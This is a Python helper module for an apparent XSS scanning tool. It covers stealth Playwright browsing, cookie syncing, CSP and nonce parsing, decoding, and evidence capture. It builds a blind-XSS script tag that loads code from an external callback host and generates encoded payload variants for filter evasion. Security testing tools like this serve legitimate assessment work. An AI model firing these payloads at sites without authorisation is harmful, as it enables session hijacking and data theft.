# utils.py — ULTRA-MAX (drop-in)
from __future__ import annotations

import os
import re
import yaml
import copy
import html
import base64
import logging
from pathlib import Path
from typing import Optional, Tuple, Dict, List, Any
from urllib.parse import urlparse, parse_qs, urlencode, unquote, urljoin, quote

from playwright.sync_api import sync_playwright
from typing import cast

# optional stealth (tidak wajib terpasang)
try:
    from playwright_stealth import stealth_sync  # type: ignore
except Exception:  # pragma: no cover
    stealth_sync = None

# gunakan UA dari config bila ada
try:
    from config import USER_AGENT  # type: ignore
except Exception:
    USER_AGENT = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/115.0.0.0 Safari/537.36"
    )

# sesi requests global untuk sinkronisasi cookie Playwright
try:
    from network import session  # type: ignore
except Exception:
    session = None  # fallback: tidak ada sinkronisasi cookie

# payload default dipakai saat merge YAML custom
try:
    from payloads import DEFAULT_XSS_PAYLOADS  # type: ignore
except Exception:
    DEFAULT_XSS_PAYLOADS = {}

logger = logging.getLogger("xsscanner.utils")

# Base URL OAST/OOB callback untuk Blind XSS
try:
    # Prefer from config if defined
    from config import OAST_BASE_URL as OOB_BASE_URL  # type: ignore
except Exception:
    # Fallback via ENV XSS_OOB_BASE_URL
    OOB_BASE_URL = os.getenv(
        "XSS_OOB_BASE_URL",
        "https://xss-oob-vercel-omuwd1kio-repor7eds-projects-d884069d.vercel.app/api",
    )

# Optional browser pool (Playwright) to reduce cold starts
_POOL_INIT = False
_POOL_LOCK = None  # set on init
_POOL = None       # list of (context, page)
_PW = None         # sync_playwright() handle
_POOL_SIZE = 0

def init_browser_pool(size: int | None = None, headless: bool = True) -> bool:
    """
    Initialize a simple Playwright browser pool with reusable pages.
    Safe to call multiple times; returns True if pool is available.
    """
    global _POOL_INIT, _POOL, _PW, _POOL_LOCK, _POOL_SIZE
    if _POOL_INIT:
        return True if (_POOL and len(_POOL) > 0) else False
    try:
        # Windows event loop policy to support subprocess
        if os.name == 'nt':
            try:
                import asyncio
                asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
            except Exception:
                pass
        from threading import Lock
        _POOL_LOCK = Lock()
        # Determine size from config if not provided
        try:
            from config import BROWSER_POOL_SIZE  # type: ignore
            _POOL_SIZE = int(size or BROWSER_POOL_SIZE or 2)
        except Exception:
            _POOL_SIZE = int(size or 2)

        _PW = sync_playwright().start()
        browser = _PW.chromium.launch(
            headless=headless,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
            ],
        )

        # Pre-create contexts + pages
        _POOL = []
        for _ in range(max(1, _POOL_SIZE)):
            try:
                context = browser.new_context(
                    java_script_enabled=True,
                    user_agent=USER_AGENT,
                    ignore_https_errors=True,
                )
                # sync cookies from requests.session (once per context)
                cookies = _requests_cookies_to_playwright()
                if cookies:
                    try:
                        context.add_cookies(cookies)
                    except Exception:
                        pass
                page = context.new_page()
                # stealth optional
                if stealth_sync:
                    try:
                        stealth_sync(page)
                    except Exception:
                        pass
                _POOL.append((context, page))
            except Exception as e:
                logger.debug(f"browser pool create context failed: {e}")
                continue
        _POOL_INIT = True
        return True if (_POOL and len(_POOL) > 0) else False
    except Exception as e:
        logger.debug(f"init_browser_pool failed: {e}")
        try:
            if _PW:
                _PW.stop()
        except Exception:
            pass
        _PW = None
        _POOL = None
        _POOL_INIT = True  # prevent retry storms; can be overridden by caller
        return False

def _acquire_page():
    """Acquire a page from the pool; returns (context, page) or (None, None)."""
    global _POOL, _POOL_LOCK
    try:
        if not _POOL or not _POOL_LOCK:
            return None, None
        with _POOL_LOCK:
            if not _POOL:
                return None, None
            return _POOL.pop(0)
    except Exception:
        return None, None

def _release_page(ctx, page):
    global _POOL, _POOL_LOCK
    try:
        # best-effort cleanup
        try:
            page.remove_listener("console", lambda *a, **k: None)  # no-op
        except Exception:
            pass
        try:
            page.goto("about:blank", wait_until="domcontentloaded", timeout=5000)
        except Exception:
            pass
        if _POOL is not None and _POOL_LOCK is not None:
            with _POOL_LOCK:
                _POOL.append((ctx, page))
    except Exception:
        pass

def shutdown_browser_pool() -> None:
    """Close pool gracefully (used at process end)."""
    global _POOL, _PW, _POOL_INIT
    try:
        if _POOL:
            for ctx, page in list(_POOL):
                try:
                    page.close()
                except Exception:
                    pass
                try:
                    ctx.close()
                except Exception:
                    pass
        _POOL = None
        if _PW:
            try:
                _PW.stop()
            except Exception:
                pass
    finally:
        _PW = None
        _POOL_INIT = False

def pool_available() -> bool:
    return bool(_POOL and len(_POOL) > 0)


def get_oob_payload(token: str) -> str:
    """
    Menghasilkan tag <script> dengan path OOB callback unik.
    """
    token = str(token).strip()
    return f'<script src="{OOB_BASE_URL}/{token}.js"></script>'


def strip_markdown(text: str) -> str:
    """
    Hapus sintaks Markdown dasar agar output AI lebih bersih.
    Aman untuk pola tanpa capturing group (tidak menyebabkan invalid group reference).
    """
    if not text:
        return ""
    cleaned = re.sub(r"```[\s\S]*?```", "", text, flags=re.MULTILINE)  # code blocks

    # (pattern, replacement) agar tidak salah referensi grup
    patterns = [
        (r"^#{1,6}\s+", ""),              # headings: hapus hash + spasi
        (r"\*\*(.*?)\*\*", r"\1"),      # bold **x**
        (r"__(.*?)__", r"\1"),            # bold __x__
        (r"\*(.*?)\*", r"\1"),          # italic *x*
        (r"_(.*?)_", r"\1"),              # italic _x_
        (r"`([^`]+)`", r"\1"),            # inline code `x`
    ]
    for pat, repl in patterns:
        try:
            cleaned = re.sub(pat, repl, cleaned, flags=re.MULTILINE)
        except re.error:
            # fallback aman: hapus pola jika terjadi error regex tak terduga
            cleaned = re.sub(pat, "", cleaned, flags=re.MULTILINE)
    return cleaned.strip()


def load_payloads_from_yaml(yaml_path: Path) -> dict:
    """
    Muat file YAML berisi payloads; gabungkan ke DEFAULT_XSS_PAYLOADS.
    Jika gagal, kembalikan salinan DEFAULT_XSS_PAYLOADS.
    """
    try:
        with open(yaml_path, "r", encoding="utf-8") as f:
            data = yaml.safe_load(f)
        if not isinstance(data, dict):
            logger.warning("Payload YAML bukan dict, menggunakan default.")
            return copy.deepcopy(DEFAULT_XSS_PAYLOADS)
        merged = copy.deepcopy(DEFAULT_XSS_PAYLOADS)
        for key, val in data.items():
            if isinstance(val, list):
                merged[key] = val
            else:
                logger.warning(f"Payload '{key}' bukan list, diabaikan.")
        logger.info(f"✔ Memuat payload custom dari {yaml_path}")
        return merged
    except Exception as e:
        logger.error(f"Gagal memuat payload YAML: {e}. Menggunakan default.")
        return copy.deepcopy(DEFAULT_XSS_PAYLOADS)


def normalize_url(full_url: str) -> str:
    """
    Normalisasi URL:
      - lower scheme+host
      - hapus fragment
      - urutkan query params
      - rapikan path (trim duplicate slash)
    """
    try:
        parsed = urlparse(full_url)
        path = parsed.path or "/"
        path = re.sub(r"/+", "/", path)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        sorted_q = urlencode({k: qs[k] for k in sorted(qs)}, doseq=True)
        scheme = (parsed.scheme or "").lower()
        netloc = (parsed.netloc or "").lower()
        return parsed._replace(
            scheme=scheme,
            netloc=netloc,
            path=path,
            query=sorted_q,
            fragment=""
        ).geturl()
    except Exception:
        return full_url


def _percent_decode_loop(s: str, max_iter: int = 5) -> str:
    prev, cur, n = None, s, 0
    while prev != cur and n < max_iter:
        prev, n = cur, n + 1
        try:
            cur = unquote(cur)
        except Exception:
            break
    return cur


def _html_unescape_loop(s: str, max_iter: int = 3) -> str:
    prev, cur, n = None, s, 0
    while prev != cur and n < max_iter:
        prev, n = cur, n + 1
        cur = html.unescape(cur)
    return cur


def decode_all(text: str) -> str:
    r"""
    Decoding berulang (defensive):
      1) Percent-decoding (loop)
      2) HTML unescape (loop)
      3) Unicode-escape decode
      4) JS hex escapes (\xhh, \uXXXX)
      5) Base64 decode (data URI & long standalone)
    """
    if not text:
        return ""

    # 1) percent loop
    s = _percent_decode_loop(text)

    # 2) html loop
    s = _html_unescape_loop(s)

    # 3) python unicode-escape (best-effort)
    try:
        s = s.encode("utf-8", "ignore").decode("unicode_escape", "ignore")
    except Exception:
        pass

    # 4) JS-style hex escapes
    def _hex_replace(m):
        try:
            return chr(int(m.group(1), 16))
        except Exception:
            return m.group(0)

    s = re.sub(r"\\x([0-9A-Fa-f]{2})", _hex_replace, s)
    s = re.sub(r"\\u([0-9A-Fa-f]{4})", _hex_replace, s)

    # 5) Base64 decode for data URI
    def _try_b64(txt: str) -> str:
        try:
            dec = base64.b64decode(txt, validate=False)
            return dec.decode("utf-8", "ignore")
        except Exception:
            return txt

    s = re.sub(
        r"data:[^;,]+;base64,([A-Za-z0-9+/=]+)",
        lambda m: _try_b64(m.group(1)),
        s,
        flags=re.IGNORECASE,
    )

    # standalone long base64 chunks
    for b64 in re.findall(r"([A-Za-z0-9+/=]{50,})", s):
        dec = _try_b64(b64)
        if dec and any(c.isprintable() for c in dec):
            s = s.replace(b64, dec)

    return s


def contains_unescaped(haystack: str, needle: str) -> bool:
    """
    True bila `needle` terlihat langsung atau setelah decode_all().
    """
    if not haystack or not needle:
        return False
    if needle in haystack:
        return True
    decoded = decode_all(haystack)
    return needle in decoded


def prepare_request_args(
    base_url: str,
    method: str,
    data: Dict[str, Any],
    is_form: bool
) -> Tuple[str, None, Optional[Dict[str, Any]]]:
    """
    Persiapkan URL dan body untuk request:
      - GET: merge existing dan new query parameters
      - POST: kembalikan body sebagai dict (form/json ditentukan caller)
    """
    parsed = urlparse(base_url)
    method = method.upper()

    if method == "GET":
        current = parse_qs(parsed.query, keep_blank_values=True)
        merged = {**current}
        for k, v in data.items():
            merged[k] = [v] if not isinstance(v, list) else v
        qs = urlencode({k: merged[k] for k in sorted(merged)}, doseq=True)
        return parsed._replace(query=qs).geturl(), None, None

    if method == "POST":
        # Rekonstruksi JSON nested dari kunci bertitik (e.g., user.name -> {user:{name:...}})
        def _merge_nested(dst: Dict[str, Any], key: str, value: Any):
            parts = [p for p in key.split('.') if p]
            cur = dst
            for i, part in enumerate(parts):
                if i == len(parts) - 1:
                    cur[part] = value
                else:
                    if part not in cur or not isinstance(cur.get(part), dict):
                        cur[part] = {}
                    cur = cur[part]  # type: ignore

        body = {}
        dotted = any(isinstance(k, str) and '.' in k for k in (data or {}))
        if dotted:
            for k, v in (data or {}).items():
                if isinstance(k, str) and '.' in k:
                    _merge_nested(body, k, v)
                else:
                    body[k] = v
            return base_url, None, body
        # caller yang menentukan form/json di layer network.make_request
        return base_url, None, data

    return base_url, None, None


def parse_csp(csp_header: str) -> Dict[str, List[str]]:
    """
    Parse Content-Security-Policy ke dict: directive -> list nilai.
    Deteksi juga presence 'require-trusted-types-for' & 'strict-dynamic'.
    """
    directives: Dict[str, List[str]] = {}
    raw = csp_header or ""
    if not raw:
        return directives

    # Split pada ';' yang diikuti nama directive
    parts = re.split(r";\s*(?=[a-z0-9-]+\s)", raw, flags=re.IGNORECASE)
    for part in parts:
        part = part.strip()
        if not part:
            continue
        tokens = part.split(None, 1)
        key = tokens[0].lower()
        vals = tokens[1].split() if len(tokens) > 1 else []
        directives[key] = vals

    # Normalisasi: tandai presence meski tanpa value
    low = raw.lower()
    if "require-trusted-types-for" in low:
        directives.setdefault("require-trusted-types-for", [])
    if "strict-dynamic" in low:
        directives.setdefault("strict-dynamic", [])

    return directives


def extract_nonces(csp_values: List[str]) -> List[str]:
    """
    Dari list seperti ["'nonce-ABC'", ...] -> ["ABC", ...]
    """
    nonces: List[str] = []
    for v in csp_values or []:
        m = re.match(r"'?nonce-([^']+)'?", v, flags=re.IGNORECASE)
        if m:
            nonces.append(m.group(1))
    return nonces


def extract_hashes(csp_values: List[str]) -> List[str]:
    """
    Ambil nilai hash dari item "'sha256-...'", "'sha384-...'", dst.
    """
    out: List[str] = []
    for v in csp_values or []:
        v = v.strip().strip("'").strip('"')
        if v.lower().startswith(("sha256-", "sha384-", "sha512-")):
            out.append(v)
    return out


def _requests_cookies_to_playwright() -> List[Dict[str, Any]]:
    """
    Konversi cookie dari requests.session ke format Playwright.
    """
    if not session:
        return []
    out: List[Dict[str, Any]] = []
    try:
        cj = session.cookies
        for c in cj:
            try:
                cookie: Dict[str, Any] = {
                    "name": c.name,
                    "value": c.value,
                    "domain": (c.domain or "").lstrip("."),
                    "path": c.path or "/",
                    "httpOnly": bool(getattr(c, "_rest", {}).get("HttpOnly", False)),
                    "secure": bool(c.secure),
                    "sameSite": "Lax",  # best-effort
                }
                # expires harus angka (epoch seconds) untuk Playwright; jika tidak valid, abaikan field ini
                exp = getattr(c, "expires", None)
                if isinstance(exp, (int, float)):
                    cookie["expires"] = int(exp)
                else:
                    try:
                        cookie["expires"] = int(exp)  # string numeric
                    except Exception:
                        pass  # jangan sertakan 'expires'

                # domain fallback dari Host header jika kosong
                if not cookie["domain"]:
                    try:
                        host = urlparse(session.headers.get("Host", "")).hostname or ""
                        cookie["domain"] = host
                    except Exception:
                        cookie["domain"] = ""

                out.append(cookie)
            except Exception:
                continue
    except Exception:
        pass
    return out


def extract_meta_csp(html_text: str) -> str:
    """Ambil nilai CSP dari meta http-equiv di HTML (jika ada)."""
    try:
        m = re.search(r"<meta[^>]+http-equiv=\"Content-Security-Policy\"[^>]*content=\"([^\"]+)\"", html_text or "", re.I)
        if m:
            return m.group(1)
    except Exception:
        pass
    return ""


def derive_csp_flags(directives: Dict[str, List[str]]) -> Dict[str, bool | List[str]]:
    """
    Dari peta directives (parse_csp) bentuk flag sederhana untuk gating payload.
    """
    flags: Dict[str, bool | List[str]] = {}
    script = [v.lower() for v in directives.get("script-src", [])]
    style = [v.lower() for v in directives.get("style-src", [])]
    sandbox = [v.lower() for v in directives.get("sandbox", [])]

    # Inline/script/eval
    flags["no_inline_script"] = ("'unsafe-inline'" not in script)
    flags["no_unsafe_eval"] = ("'unsafe-eval'" not in script)
    flags["allow_data_script"] = any(v.startswith("data:") for v in script)
    flags["allow_blob_script"] = any(v.startswith("blob:") for v in script)
    flags["strict_dynamic"] = any(v == "'strict-dynamic'" for v in script)

    # Style inline
    flags["style_no_inline"] = ("'unsafe-inline'" not in style)

    # Sandbox without allow-scripts
    flags["frame_sandbox_no_scripts"] = bool(directives.get("sandbox")) and not any("allow-scripts" in v for v in sandbox or [])

    # Whitelist-ish domains for script/link
    def _domains(vals: List[str]) -> List[str]:
        out: List[str] = []
        for v in vals:
            v = v.strip().strip("'")
            if any(v.startswith(p) for p in ("http:", "https:", "data:", "blob:", "'", "*")):
                if v.startswith(("http:", "https:")):
                    out.append(v)
            elif v and v not in ("self",):
                out.append(v)
        return out

    flags["script_domains"] = _domains(directives.get("script-src", []))
    flags["style_domains"] = _domains(directives.get("style-src", []))
    return flags


def extract_nonces_from_html(html_text: str) -> List[str]:
    """
    Cari nilai nonce dari atribut nonce pada <script> di HTML.
    Mengembalikan list unik nonces.
    """
    try:
        nonces: List[str] = []
        for m in re.finditer(r"<script[^>]*\snonce=([\"'])([^\"']+)\1", html_text or "", re.I):
            val = m.group(2).strip()
            if val and val not in nonces:
                nonces.append(val)
        return nonces
    except Exception:
        return []


def fetch_dynamic_html(url: str, wait_selector: str = None, timeout: int = 15000) -> Optional[str]:
    """
    Render halaman dengan Playwright & ambil HTML setelah load.
    Tambahan “turbo”:
      • Sinkronisasi cookie dari requests.session (jika ada)
      • User-Agent diset dari config.USER_AGENT
      • Block resource berat (image/font/video/pdf) untuk kecepatan
      • Stealth (opsional) & simulasi interaksi user (hover/click/tab/scroll)
    """
    # Try pooled fast path first
    try:
        if pool_available() or init_browser_pool():
            ctx, page = _acquire_page()
            if ctx and page:
                try:
                    # lightweight routing: block heavy assets
                    def _route(route):
                        try:
                            req = route.request
                            u = req.url.lower()
                            if any(u.endswith(ext) for ext in (".png",".jpg",".jpeg",".gif",".webp",".svg",".ico",".woff",".woff2",".ttf",".otf",".mp4",".mp3",".pdf",".zip",".rar")):
                                return route.abort()
                        except Exception:
                            pass
                        return route.continue_()
                    try:
                        ctx.route("**/*", _route)
                    except Exception:
                        pass

                    try:
                        page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                    except Exception:
                        page.goto(url, wait_until="commit", timeout=timeout)

                    if wait_selector:
                        try:
                            page.wait_for_selector(wait_selector, timeout=timeout)
                        except Exception:
                            pass

                    # light interaction
                    try:
                        page.hover("body")
                        for _ in range(3):
                            page.keyboard.press("Tab")
                        page.keyboard.type("xss")
                        page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                        page.wait_for_timeout(120)
                        page.evaluate("window.scrollTo(0, 0)")
                    except Exception:
                        pass

                    content = page.content()
                    try:
                        ctx.unroute("**/*")
                    except Exception:
                        pass
                    _release_page(ctx, page)
                    return content
                except Exception as e:
                    try:
                        _release_page(ctx, page)
                    except Exception:
                        pass
                    logger.debug(f"pooled fetch failed, fallback: {e}")
    except Exception:
        pass

    # Fallback: standalone Playwright session
    try:
        # Ensure Windows uses Selector loop to support subprocess in Playwright
        if os.name == 'nt':
            try:
                import asyncio  # local import to avoid global dependency
                asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
            except Exception:
                pass
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--disable-dev-shm-usage",
                    "--no-sandbox",
                ],
            )
            context = browser.new_context(
                java_script_enabled=True,
                user_agent=USER_AGENT,
                ignore_https_errors=True,
            )

            # sinkronisasi cookie
            cookies = _requests_cookies_to_playwright()
            if cookies:
                try:
                    context.add_cookies(cookies)
                except Exception as e:
                    logger.debug(f"add_cookies failed: {e}")

            # block resource berat
            def _route(route):
                try:
                    req = route.request
                    u = req.url.lower()
                    if any(u.endswith(ext) for ext in (".png",".jpg",".jpeg",".gif",".webp",".svg",".ico",".woff",".woff2",".ttf",".otf",".mp4",".mp3",".pdf",".zip",".rar")):
                        return route.abort()
                except Exception:
                    pass
                return route.continue_()

            context.route("**/*", _route)

            page = context.new_page()
            if stealth_sync:
                try:
                    stealth_sync(page)
                except Exception:
                    pass

            try:
                page.goto(url, wait_until="domcontentloaded", timeout=timeout)
            except Exception:
                # fallback lebih longgar
                page.goto(url, wait_until="commit", timeout=timeout)

            # tunggu elemen spesifik jika diminta
            if wait_selector:
                try:
                    page.wait_for_selector(wait_selector, timeout=timeout)
                except Exception:
                    pass

            # ==== simulasi interaksi untuk memicu event-based XSS ====
            try:
                # klik titik acak
                page.mouse.move(120, 140); page.mouse.click(120, 140)
                page.mouse.move(420, 260); page.mouse.click(420, 260)
                # hover
                page.hover("body")
                # tab berulang (onfocus/onblur/onkeydown)
                for _ in range(5):
                    page.keyboard.press("Tab")
                page.keyboard.type("xss")
                # scroll atas-bawah
                page.evaluate("window.scrollTo(0, document.body.scrollHeight)")
                page.wait_for_timeout(200)
                page.evaluate("window.scrollTo(0, 0)")
                page.wait_for_timeout(200)
                # klik elemen interaktif umum
                for sel in ["button", "a[href]", "[role='button']", "[onclick]", "input[type=submit]"]:
                    try:
                        for el in page.query_selector_all(sel):
                            if el.is_visible() and el.is_enabled():
                                el.click(timeout=800, no_wait_after=True)
                                page.wait_for_timeout(120)
                    except Exception:
                        continue
            except Exception as ee:
                logger.debug(f"[playwright] simulasi event gagal: {ee}")

            # ambil HTML akhir
            content = page.content()

            try:
                page.close()
            except Exception:
                pass
            try:
                context.close()
            except Exception:
                pass
            try:
                browser.close()
            except Exception:
                pass

            return content
    except Exception as e:
        logger.warning(f"fetch_dynamic_html('{url}') Playwright error: {e}")
        return None

def _redact_text_basic(s: str) -> str:
    try:
        import re as _re
        if not s:
            return s
        s = _re.sub(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}", "[REDACTED_EMAIL]", s)
        s = _re.sub(r"eyJ[\w-]+\.[\w-]+\.[\w-]+", "[REDACTED_JWT]", s)
        s = _re.sub(r"\b[0-9a-fA-F]{24,}\b", "[REDACTED_HEX]", s)
        s = _re.sub(r"(?i)(session|token|auth|apikey|api_key|bearer)=([^&\s]+)", r"\1=[REDACTED]", s)
        return s
    except Exception:
        return s


def capture_page_evidence(url: str, out_dir: Path, base_name: str = "evidence", *, redact: bool = False, keep_raw: bool = False) -> Dict[str, str]:
    """
    Navigate to URL and save screenshot + HTML to out_dir.
    Returns dict with keys: screenshot, html.
    Best-effort; failures return empty dict.
    """
    out: Dict[str, str] = {}
    try:
        out_dir.mkdir(parents=True, exist_ok=True)
    except Exception:
        return out

    # Try pooled page for speed
    try:
        if pool_available() or init_browser_pool():
            ctx, page = _acquire_page()
            if ctx and page:
                try:
                    page.goto(url, wait_until="domcontentloaded", timeout=20000)
                    img = out_dir / f"{base_name}.png"
                    htmlp = out_dir / f"{base_name}.html"
                    try:
                        page.screenshot(path=str(img), full_page=True)
                        out["screenshot"] = str(img)
                    except Exception:
                        pass
                    try:
                        html_content = page.content()
                        if redact:
                            # save raw if requested
                            if keep_raw:
                                raw_dir = out_dir / "raw"
                                try:
                                    raw_dir.mkdir(parents=True, exist_ok=True)
                                    try:
                                        os.chmod(str(raw_dir), 0o700)
                                    except Exception:
                                        pass
                                    (raw_dir / f"{base_name}.html").write_text(html_content, encoding="utf-8")
                                    out["html_raw"] = str(raw_dir / f"{base_name}.html")
                                except Exception:
                                    pass
                            html_content = _redact_text_basic(html_content)
                        htmlp.write_text(html_content, encoding="utf-8")
                        out["html"] = str(htmlp)
                    except Exception:
                        pass
                finally:
                    _release_page(ctx, page)
                return out
    except Exception:
        pass

    # Fallback one-off
    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True)
            context = browser.new_context(java_script_enabled=True, user_agent=USER_AGENT, ignore_https_errors=True)
            page = context.new_page()
            page.goto(url, wait_until="domcontentloaded", timeout=20000)
            img = out_dir / f"{base_name}.png"
            htmlp = out_dir / f"{base_name}.html"
            try:
                page.screenshot(path=str(img), full_page=True)
                out["screenshot"] = str(img)
            except Exception:
                pass
            try:
                html_content = page.content()
                if redact:
                    if keep_raw:
                        raw_dir = out_dir / "raw"
                        try:
                            raw_dir.mkdir(parents=True, exist_ok=True)
                            try:
                                os.chmod(str(raw_dir), 0o700)
                            except Exception:
                                pass
                            (raw_dir / f"{base_name}.html").write_text(html_content, encoding="utf-8")
                            out["html_raw"] = str(raw_dir / f"{base_name}.html")
                        except Exception:
                            pass
                    html_content = _redact_text_basic(html_content)
                htmlp.write_text(html_content, encoding="utf-8")
                out["html"] = str(htmlp)
            except Exception:
                pass
            try:
                page.close(); context.close(); browser.close()
            except Exception:
                pass
    except Exception:
        pass
    return out


def generate_encoding_variants(payload: str) -> Dict[str, str]:
    """
    Berbagai varian encoding untuk payload:
      • entity_hex        : &#x3c; dan &#x3e;
      • entity_dec        : &#60; dan &#62;
      • entity_no_semi    : &#x3c &#x3e (tanpa ;)
      • percent           : %3C…%3E
      • double_percent    : %253C…%253E
      • unicode_escape    : \\u003c…\\u003e
      • js_hex_escape     : \\x3c…\\x3e
    """
    variants: Dict[str, str] = {}

    # Entity hex untuk <, >, dan kutip
    def _entity_hex(c: str) -> str:
        return f"&#x{ord(c):x};" if c in "<>\"'" else c
    variants["entity_hex"] = "".join(_entity_hex(c) for c in (payload or ""))

    # Entity decimal untuk <, >, dan kutip
    def _entity_dec(c: str) -> str:
        return f"&#{ord(c)};" if c in "<>\"'" else c
    variants["entity_dec"] = "".join(_entity_dec(c) for c in (payload or ""))

    # Entity tanpa semicolon (sebagian parser toleran)
    def _entity_no_semi(c: str) -> str:
        if c in "<>\"'":
            return f"&#x{ord(c):x}"  # tanpa ;
        return c
    variants["entity_no_semi"] = "".join(_entity_no_semi(c) for c in (payload or ""))

    # Percent-encode penuh
    variants["percent"] = quote(payload or "")

    # Double-percent-encode
    variants["double_percent"] = quote(variants["percent"])

    # Unicode-escape untuk <, >, dan kutip
    variants["unicode_escape"] = "".join(
        f"\\u{ord(c):04x}" if c in "<>\"'" else c
        for c in (payload or "")
    )

    # JS hex escapes untuk <, >, dan kutip
    variants["js_hex_escape"] = "".join(
        f"\\x{ord(c):02x}" if c in "<>\"'" else c
        for c in (payload or "")
    )

    return variants
